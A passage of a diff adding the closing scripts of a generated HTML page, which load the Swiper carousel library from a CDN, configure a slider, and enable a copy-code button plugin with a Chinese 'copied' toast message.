+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
